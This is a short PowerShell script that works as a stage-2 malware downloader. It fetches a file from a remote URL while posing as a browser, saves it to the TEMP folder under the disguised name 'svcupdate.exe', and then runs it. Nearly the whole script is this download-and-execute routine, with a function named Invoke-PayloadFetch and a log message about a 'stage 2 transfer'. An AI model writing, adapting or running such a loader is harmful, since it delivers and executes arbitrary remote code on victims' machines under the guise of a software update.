
[CmdletBinding()]
param(
    [string]$FetchUrl = "https://adatum.com/assets/update.dat",
    [string]$OutputPath = "$env:TEMP\svcupdate.exe",
    [int]$ConnectionTimeout = 30,
    [string]$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$StageResult = Invoke-PayloadFetch -SourceUrl $FetchUrl -DestinationPath $OutputPath -TimeoutSec $ConnectionTimeout -UserAgent $RequestAgent
if ($StageResult) {
    Start-Process -FilePath $OutputPath
}

$ProgressPreference = "SilentlyContinue"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
